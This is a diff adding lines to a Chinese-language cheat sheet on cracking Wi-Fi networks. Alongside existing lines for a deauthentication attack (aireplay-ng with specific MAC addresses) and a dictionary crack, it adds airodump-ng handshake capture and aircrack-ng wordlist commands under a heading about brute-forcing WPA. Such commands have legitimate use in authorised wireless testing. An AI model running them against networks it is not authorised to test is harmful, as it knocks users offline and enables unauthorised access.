@@ -88,3 +88,13 @@ aircrack-ng  -w <字典文件> *.cap
 强制断开
 	aireplay-ng -0 1  -a 6C:E8:73:50:85:F0 -c 00:1B:77:BE:19:FC mon0
 
+
+# 暴力wap的
+
+```
+airodump-ng -c 6  -w [filename] mon0
+```
+
+```
+aircrack-ng  -w [字典] *.cap 
+```
